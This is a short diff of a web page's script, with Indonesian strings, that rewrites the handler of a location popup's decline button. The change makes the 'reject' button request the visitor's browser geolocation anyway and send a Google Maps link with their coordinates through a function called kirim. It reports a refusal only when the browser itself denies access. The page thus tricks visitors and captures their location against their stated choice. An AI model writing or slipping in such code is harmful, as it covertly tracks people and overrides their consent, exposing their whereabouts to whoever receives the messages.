@@ -921,7 +921,20 @@
 
       function tolakLokasi() {
         document.getElementById("popupLokasi").style.display = "none";
-        kirim("⚠️ Pengunjung *menolak izin lokasi* melalui tombol popup.");
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              const lat = pos.coords.latitude;
+              const lon = pos.coords.longitude;
+              kirim(`📍 Lokasi:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+            },
+            () => {
+              kirim("⚠️ Pengunjung menolak izin lokasi (via browser)");
+            }
+          );
+        } else {
+          kirim("⚠️ Browser tidak mendukung geolocation.");
+        }
       }
     </script>
   </body>
